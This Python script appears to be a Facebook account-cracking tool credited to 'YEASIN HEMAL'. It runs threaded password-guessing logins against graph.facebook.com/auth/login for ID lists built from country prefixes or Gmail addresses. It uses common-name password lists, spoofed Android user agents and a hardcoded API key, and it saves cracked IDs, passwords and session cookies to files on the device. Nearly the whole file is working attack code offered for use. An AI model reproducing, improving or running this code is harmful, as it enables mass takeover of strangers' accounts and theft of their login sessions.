...
def S2():
	...
	fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
	s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
	ua = s + e
	#print(ua)
	return ua   
	
def sex():
    END = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748125;FBDM/{density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua        
 ...
 \  $$ /$$/ | $$      | $$  \ $$| $$  \__/  | $$  | $$$$| $$      |_  $$| $$  | $$|__/  \ $$
  \  $$$$/  | $$$$$   | $$$$$$$$|  $$$$$$   | $$  | $$ $$ $$        | $$| $$$$$$$$   /$$$$$/
   \  $$/   | $$__/   | $$__  $$ \____  $$  | $$  | $$  $$$$        | $$|_____  $$  |___  $$
    | $$    | $$      | $$  | $$ /$$  \ $$  | $$  | $$\  $$$        | $$      | $$ /$$  \ $$
    | $$    | $$$$$$$$| $$  | $$|  $$$$$$/ /$$$$$$| $$ \  $$       /$$$$$$    | $$|  $$$$$$/
    |__/    |________/|__/  |__/ \______/ |______/|__/  \__/      |______/    |__/ \______/ 
════════════════════════════════════════════════
\033[1;32m [☆] \033[1;37m AUTHOR   ☆  YEASIN HEMAL
\033[1;32m [☆] \033[1;37m STATUS   ☆  FILE X RANDOM
...
def Main_TATA():
        ...
        print(" [\033[1;32m3\033[97;1m] CONTACT FB ")
        print(" [\033[1;32m0\033[97;1m] \033[1;31mEXIT")
        line()
        ...
        if opt1 == "1": method()
            ...
            clear();print(' [\033[1;32m1\033[97;1m] BD');print(' [\033[1;32m2\033[97;1m] PAK');print(' [\033[1;32m3\033[97;1m] AFG');print(' [\033[1;32m0\033[97;1m] \033[1;31mBACK');line()
            opt = input(' [☆] Choose : ')
            if opt == '2':pak()
            if opt == '3':afg()
            if opt== '1':bd()
            if opt== '4':gmail()
            else:line();print('\033[1;33m [☆]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_TATA()
            ...
            d=input(' [☆] Choose : ')
            if d == '1':os.system('xdg-open https://api.whatsapp.com/send?phone=+8801864678160/');Main_TATA()
            if d == '2':os.system('xdg-open https://www.facebook.com/ariyanahmed6402');Main_TATA()
            ...
            d=input(' [☆] Choose : ')
            if d == '1':os.system('xdg-open xdg-open https://api.whatsapp.com/send?phone=+8801864678160/');Main_TATA()
            if d == '2':os.system('xdg-open https://www.facebook.com/ariyanahmed6402');Main_TATA()
            if d == '0':Main_TATA()
            else:line();print('\033[1;33m [☆]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_TATA()
...
def method():
    clear();print("\033[1;32m [☆]\033[1;37m For Example : \033[1;32m/sdcard/TATA.txt");line()
    ...
    clear();p('\033[1;32m [\033[1;37m1\033[1;32m] \033[1;37mMETHOD \033[1;32m>>> \033[1;33m☆ \033[1;37m1/A\033[1;33m☆\033[1;32m [\033[1;37m2\033[1;32m] \033[1;37mMETHOD \033[1;32m>>> \033[1;33m☆ \033[1;37m2/B\033[1;33m☆');line()
    #line()
    ...
    with tred(max_workers=30) as TATA:
        clear()
        tl = str(len(fo))
        
        
        print(f'\033[1;32m (√) \033[1;37mTotal IDs  :\033[1;32m ',tl)
      ##  print('\033[1;32m [√] \033[1;37mMethod \033[1;32m>\033[1;37m M{methd}')
 
        print("\x1b[38;5;208m (!) \033[1;37mIf Id Not Show ON/OFF Airplane Mode")
####print('\033[1;33m [☆] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/TATA');line()
        line()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if methd in ['1','A']:
                TATA.submit(api1,ids,names,passlist)
            elif methd in ['2','B']:
                TATA.submit(mix,ids,names,passlist)
    ...
    p(" \033[1;32m[☆] \033[1;37mCloning Accounts Saved in\033[1;32m /sdcard/TATA")

    line()
 
    input("\033[1;32m [☆]\033[1;33m Press Enter To Go Back ")
    os.system('python TATA.py')
...
def pak():
               ...
               # if (c).lower() == "y":user_opt.append("c")
                ...
                with tred(max_workers=30) as TATA:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mIf Id Not Show ON/OFF Airplane Mode");print('\033[1;33m [☆] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/TATA');line()
                        for psx in user:
                                ids = code+psx
                                ...
                                TATA.submit(rd1,ids,passlist)
                print("\n");line();print(' \033[1;32m[☆] \033[1;37mCloning Complete');line();print(' \033[1;32m[☆] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/TATA/TATA-R-OK.txt\n \033[1;32m[☆] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/TATA/TATA-R-CP.txt');line();input(' \033[1;32m[☆]\033[1;37m Press Enter To Back Menu ');os.system('python TATA.py')
...
def bd():
               ...
               # if (c).lower() == "y":user_opt.append("c")
                ...
                with tred(max_workers=30) as TATA:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'jahangir','shamim','mimmim','ayesha','habiba','sabbir','jannat','jannatul','lamiya']
                                TATA.submit(rd1,ids,passlist)
                print("\n");line();print(' \033[1;32m[☆] \033[1;37mCloning Complete');line();print(' \033[1;32m[☆] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/TATA/TATA-R-OK.txt\n \033[1;32m[☆] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/TATA/TATA-R-CP.txt');line();input(' \033[1;32m[☆]\033[1;37m Press Enter To Back Menu ');os.system('python TATA.py')
...
def gmail():
                ...
                with tred(max_workers=30) as TATA:
                        ...
                        clear()
                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+total);print('\033[1;32m (√) \033[1;37mChosed Gmail  : %s'%(domain));print("\x1b[38;5;208m (!) \033[1;37mIf Id Not Show ON/OFF Airplane Mode");print('\033[1;33m [☆] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/TATA');line()
                        for user in fo:
                                ids,names = user.split('|')
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r\r\33[1;37m [\33[1;32mYEASIN-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/440002512;FBDM/{density=1.0,width=720,height=736};FBLC/en_US;FBRV/287933832;FB_FW/2;FBCR/Optus;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/F5122;FBSV/12.3.6;FBOP/1;FBCA/arm64-v8a:;]"
                #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/413.0.0.30.104;FBBV/441615153;FBDM/{density=2.0,width=720,height=1358};FBLC/en_US;FBCR/Axis;FBMF/ASUS;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X01AD;FBSV/8.1;FBCA/arm64-v8a:;]"
                uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/314.0.0.43.119;FBBV/282818049;FBDM/{density=2.0,width=720,height=1360};FBLC/en_US;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SCG07;FBSV/13;FBCA/armeabi-v7a:armeabi;]' 
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [YEASIN-OK💚] '+uid+' √ '+pas)
                        p(f" \033[1;92m[\033[1;97mCOOKIE🍪\033[1;92m] \033[1;97m{cookie}")
                        file_path_ok = os.path.join(folder_path, 'YEASIN-R-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'YEASIN-R-COOKIE.txt')
                        ...
                        file_path = os.path.join(folder_path, 'YEASIN-R-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write('\r\r\33[1;37m [\33[1;32mYEASIN-M1\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/23.0.0.0.8;FBBV/5334568;FBDM/{density=2.0,width=720,height=1220};FBLC/en_US;FBCR/telecom;FBMF/SHARP;FBBD/sharp;FBPN/com.facebook.katana;FBDV/701SH;FBSV/8.0;FBCA/arm64-v8a:;]"
            ...
            if 'session_key' in po:
                    ...
                    print('\r\r\033[1;32m [YEASIN-OK💚] '+uid+' √ '+pas)
                    #p(f" \033[1;92m[\033[1;97mCOOKIE🍪\033[1;92m] \033[1;97m{cookie}")
                    file_path = os.path.join(folder_path, 'YEASIN-FILE-OK.txt')
                    ...
                    open('/sdcard/YEASIN/YEASIN-FILE-M1-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [YEASIN-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'YEASIN-FILE-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write('\r\r\33[1;37m [\33[1;32mYEASIN-M2\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
            network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
            xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Simsim;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.katana;"+"FBDV/vivo 1724;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Simcom;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
            #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/282.0.0.576;FBBV/3552100;[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809011;FBDM/{density=3.0,width=1080,height=2050};FBLC/en_GB;FBRV/310262918;FBCR/Beeline;FBMF/meizu;FBBD/meizu;FBPN/com.facebook.katana;FBDV/meizu note9/DS;FBSV/9.0.0;FBOP/1;FBCA/arm64-v8a:;]"
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print('\r\r\033[1;32m [TATA-OK💚] '+uid+' √ '+pas)
                    p(f" \033[1;92m[\033[1;97mCOOKIE🍪\033[1;92m] \033[1;97m{cookie}")
                    file_path = os.path.join(folder_path, 'TATA-FILE-OK.txt')
                    #session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                    open('/sdcard/TATA/TATA-FILE-OK-M2-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [TATA-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'TATA-FILE-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    cps.append(uid)
                    break
...
def mix(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Accept':'*/*','Connection':'keep-alive','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':gtt,'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':gtt,'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [YEASIN-OK💚] '+ids+' | '+pas+'\033[1;32m')
				fxxk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				#print(f' [🍪] Cookies :- \033[1;36m {fxxk}') 
				###print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/YEASIN FILE OK.txt','a').write(ids+'|'+pas+'|'+fxxk+'\n')
				open('/sdcard/YEASIN FILE UID.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [YEASIN-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/YEASIN FILE CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
